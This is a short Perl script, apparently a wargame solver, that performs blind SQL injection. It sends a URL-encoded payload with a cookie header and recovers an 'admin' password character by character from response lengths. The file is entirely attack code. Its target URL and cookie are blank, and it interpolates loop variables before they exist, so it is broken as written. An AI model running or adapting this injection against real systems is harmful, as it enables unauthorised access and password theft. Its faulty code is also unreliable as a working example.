#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Tiny;
use vars qw($URL $PAYLOAD $COOKIE @CHARSET $VALUE);

@CHARSET = (
  48 .. 57,  # 0-9
# 97 .. 102, # a-f
# 65 .. 90,  # A-Z
  97 .. 122, # a-z
);

$URL =

;

$PAYLOAD =
  "pw=%27||id=%27admin%27%26%26(ord(mid(pw,$POS,1))=$ORD".
  "%26%26(select%201%20union%20select%20pw))||%27",
;

$COOKIE =

;

for my $POS (1 .. 8) {
  for my $ORD (@CHARSET) {
    my $REQ = HTTP::Tiny->new->get($URL.$PAYLOAD, {
        headers => {
          "Cookie" => $COOKIE,
        },
    });

    # ---------------------------------------------
    if (length $REQ->{content} == 0) {
      $VALUE .= chr $ORD;
      print "$POS => $ORD, Total: '$VALUE'\n";
      last;
    }
    # ---------------------------------------------
  }
}

# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
